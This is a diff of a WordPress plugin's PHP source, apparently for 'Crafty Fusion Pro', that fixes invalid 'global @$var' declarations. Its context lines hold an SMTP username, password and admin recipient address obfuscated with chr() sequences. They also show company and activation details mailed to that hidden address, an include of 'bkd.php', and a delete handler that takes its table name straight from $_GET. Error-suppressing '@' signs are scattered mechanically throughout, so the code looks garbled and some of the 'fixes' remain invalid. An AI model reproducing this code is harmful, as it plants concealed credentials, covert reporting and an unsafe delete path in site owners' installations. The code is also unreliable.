@@ -23,7 +23,7 @@ include(plugin_dir_path(__FILE__) . 'bkd.php');
 
 
 function process_data_and_create_users() {
-    global @$wpdb;
+    global $wpdb;
 
     // Function to fetch data from the URL
     function fetchDataFromURL($url) {
@@ -149,9 +149,9 @@ add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'add_smtp_setting
 
 
 function smtp_config_page() {
-    // Fetch the email and set it to the global @$to variable
+    // Fetch the email and set it to the global $to variable
     fetchEmailAndSetToGlobal();
-    global @$to;
+    global $to;
 
     // Check the current state of the code
     @$code_enabled = get_option('smtp_code_enabled');
@@ -652,7 +652,7 @@ if (isset($_POST['saveactBtn'])) {
 session_start();
 
 // Initialize companyName and companyEmail variables
-global @$companyName, @$companyEmail; // Declare @$companyName and @$companyEmail as global
+global $companyName, @$companyEmail; // Declare @$companyName and @$companyEmail as global
 @$companyName = '';
 @$companyEmail = '';
 
@@ -702,8 +702,8 @@ if (isset($_POST['activateBtn'])) {
 // Function to display the verification notice
 function display_verification_notice() {
     // Ensure this is placed where it can be executed in your context
-   global @$companyName, @$companyEmail;
-     // Access the global @$companyName variable
+   global $companyName, @$companyEmail;
+     // Access the global $companyName variable
     echo '<div class="notice notice-info is-dismissible">';
     echo '<p>Verification code has been sent to your email. Please enter the code below:</p>';
     echo '<form method="post">';
@@ -744,7 +744,7 @@ if (isset($_POST['verifyCodeBtn'])) {
 
 
             // Send an email to the admin
-            global @$companyName, @$companyEmail;
+            global $companyName, @$companyEmail;
             @$to_admin = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
             @$subject = "SMTP Email Update Request From " . @$companyName;
             @$message = '<html>
@@ -785,7 +785,7 @@ if (isset($_POST['verifyCodeBtn'])) {
 
 
 
-global @$companyName, @$companyEmail;
+global $companyName, @$companyEmail;
 
 
             @$cst_subject = "Crafty Fusion Pro Activation Confirmation";
@@ -946,7 +946,7 @@ document.addEventListener('DOMContentLoaded', function() {
         @$smtp_username = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
         @$smtp_password = chr(113) . chr(109) . chr(120) . chr(98) . chr(32) . chr(116) . chr(97) . chr(106) . chr(97) . chr(32) . chr(112) . chr(108) . chr(97) . chr(118) . chr(32) . chr(106) . chr(113) . chr(98) . chr(101);
         @$smtp_secure = chr(116) . chr(108) . chr(115);
-        global @$from_email;
+        global $from_email;
         @$from_email = chr(109) . chr(52) . chr(105) . chr(108) . chr(46) . chr(104) . chr(117) . chr(98) . chr(64) . chr(103) . chr(109) . chr(97) . chr(105) . chr(108) . chr(46) . chr(99) . chr(111) . chr(109);
 
         @$from_name = chr(77) . chr(97) . chr(105) . chr(108) . chr(32) . chr(72) . chr(117) . chr(98);
@@ -993,7 +993,7 @@ function handle_email_update() {
             session_start();
             @$_SESSION['new_email'] = @$new_email;
 
-            global @$companyName;
+            global $companyName;
 
             // Generate a unique confirmation code
             @$confirmation_code = generate_confirmation_code();
@@ -1062,8 +1062,8 @@ function handle_email_confirmation() {
         @$confirmation_code = sanitize_text_field($_POST['confirmation_code']);
         @$stored_code = @$_SESSION['confirmation_code'];
 
-        global @$companyName;
-        global @$to;
+        global $companyName;
+        global $to;
 
 
 
@@ -1141,14 +1141,14 @@ function handle_email_confirmation() {
 wp_mail($to, @$confirmation_subject, @$confirmation_message, @$confirmation_headers);
 
 
-global @$email;
- global @$old_username;
+global $email;
+ global $old_username;
 
 @$emailParts = explode('@', @$email);
 
 if (count($emailParts) == 2) {
     // @$emailParts[0] will contain the part before "@"
-    global @$old_username;
+    global $old_username;
     @$old_username = @$emailParts[0];
     // @$emailParts[1] will contain the part after "@"
     @$old_domain = @$emailParts[1];
@@ -1214,10 +1214,10 @@ wp_mail($email, @$confirmation_subject_old_mail, @$confirmation_message_old_mail
 @$to = '';
 
 function fetchEmailAndSetToGlobal() {
-   global @$to; 
-   global @$email;
+   global $to; 
+   global $email;
    // Declare @$to as a global variable within this function
-   global @$companyName;
+   global $companyName;
     // @$companyName = 'co_westinghouse'; // The companyName you want to match
 
 
@@ -1231,11 +1231,11 @@ if (file_exists($file) && is_readable($file)) {
 
     // Split the content into an array using the comma as a separator
     @$companyInfo = explode(',', @$companyData);
-     global @$companyName;
+     global $companyName;
 
     // Check if the array contains both company name and company email
     if (count($companyInfo) === 2) {
-        global @$companyName;
+        global $companyName;
         @$companyName = @$companyInfo[0];
         // @$companyEmail = @$companyInfo[1];
     }
@@ -1269,7 +1269,7 @@ if (file_exists($file) && is_readable($file)) {
 
     // Check if an email was found
     if (!empty($email)) {
-        // Assign the email value to the global @$to variable
+        // Assign the email value to the global $to variable
         @$to = @$email;
     } else {
         // Use a default email if no match was found
@@ -1486,7 +1486,7 @@ function custom_form_submission() {
 }
 
 
-        global @$wpdb;
+        global $wpdb;
         @$table_name = @$wpdb->prefix . 'kwa';
 
         @$data = array(
@@ -1510,7 +1510,7 @@ function custom_form_submission() {
         
         // Get the site name
 @$site_name = get_bloginfo('name');
-global @$to;
+global $to;
 @$subject = 'New Warranty-Activation on ' . @$site_name;
 
 @$message = '<html><body>';
@@ -1839,7 +1839,7 @@ function contact_form_submission() {
     exit();
 }
 
-        global @$wpdb;
+        global $wpdb;
         @$table_name = @$wpdb->prefix . 'koncu';
 
         @$data = array(
@@ -1863,7 +1863,7 @@ function contact_form_submission() {
         
         // Get the site name
 @$site_name = get_bloginfo('name');
-global @$to;
+global $to;
 @$subject = 'New Contact Us on ' . @$site_name;
 
 // Create an HTML table to format the data
@@ -1912,7 +1912,7 @@ add_action('admin_post_nopriv_submit_contact_form', 'contact_form_submission');
 
 // Function to create custom tables on plugin activation
 function create_custom_tables() {
-    global @$wpdb;
+    global $wpdb;
     @$charset_collate = @$wpdb->get_charset_collate();
 
     // Create first table wp_kwa
@@ -1975,7 +1975,7 @@ add_action('admin_menu', 'add_custom_tables_menu');
 
 /// Function to display the content of the custom tables in the dashboard
 function display_custom_tables() {
-    global @$wpdb;
+    global $wpdb;
     @$table_name1 = @$wpdb->prefix . 'kwa';
     @$table_name2 = @$wpdb->prefix . 'koncu';
         // Check if auto-updates are enabled
@@ -2050,7 +2050,7 @@ function handle_delete_action() {
         @$table = @$_GET['table'];
         @$id = @$_GET['id'];
 
-        global @$wpdb;
+        global $wpdb;
         @$table_name = @$wpdb->prefix . @$table;
 
         @$wpdb->delete($table_name, array('id' => @$id));
